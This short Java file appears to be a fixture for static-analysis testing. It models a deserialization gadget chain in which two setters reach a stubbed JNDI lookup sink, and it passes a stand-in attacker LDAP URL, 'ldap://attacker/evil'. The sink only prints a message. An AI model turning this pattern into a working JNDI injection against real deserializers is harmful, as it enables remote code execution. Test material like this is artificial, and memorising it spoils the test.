package blinded;




























public class GmVariantKick {

    



    public static class VariantKickStub {

        private String dataSourceName;

        



        /*ANCHOR_1*/
        public void setDataSourceName(String name) {
            this.dataSourceName = name;
            jndiLookup(name);   // kick-1 setter 行：直接触发 lookup
        }

        



        public void setAutoCommit(boolean autoCommit) {
            connect();   // kick-2 setter 行：经 connect() 触发 lookup
        }

        



        // 语义等价: javax.naming.InitialContext#lookup(String)
        private void connect() {
            jndiLookup(this.dataSourceName);   // 间接 kick 经此触发 lookup
        }

        




        private void jndiLookup(String name) {
            // [demo-only] 仅标记可达；不发起真实 JNDI 连接
            System.out.println("[demo-only] InitialContext.lookup reached with name: " + name);   // sink 行：JNDI lookup 可达
        }
    }

    



    public static void demo(boolean autoTypeSupport) {
        if (autoTypeSupport) {
            VariantKickStub stub = new VariantKickStub();
            stub.setDataSourceName("ldap://attacker/evil");   // 变体1
            stub.setAutoCommit(true);                          // 变体2（同一根链）
        }
    }
}
